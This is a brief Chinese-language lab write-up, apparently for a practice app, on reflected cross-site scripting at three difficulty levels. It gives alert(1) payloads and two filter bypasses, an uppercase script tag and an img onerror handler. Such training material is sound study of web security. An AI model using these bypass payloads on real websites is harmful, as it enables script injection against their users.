# XSS ( Reflected )
反射型XSS: Reflected 是指不會儲存在資料庫中，而是由網頁後端直接嵌入由前端使用者所傳送過來的內容要成的，最常見的方法就是以GET方法傳送資料給伺服器時，伺服器未檢查就將內容回憶到網頁上所產生的漏洞

## LOW

直接在上面打
```
    <script>alert(1)</script>
```

## Medium
輸入
```
    <script>alert(1)</script>
```
會發現輸出變成alert(1)，script被替換掉了
因此將輸入框改為大寫即可
```
    <SCRIPT>alert(1)</script>
```

## HIGH
被過濾的字詞更多了，但還是可以用img的方式傳
```
    <img src/onerror = alert(1)>
```

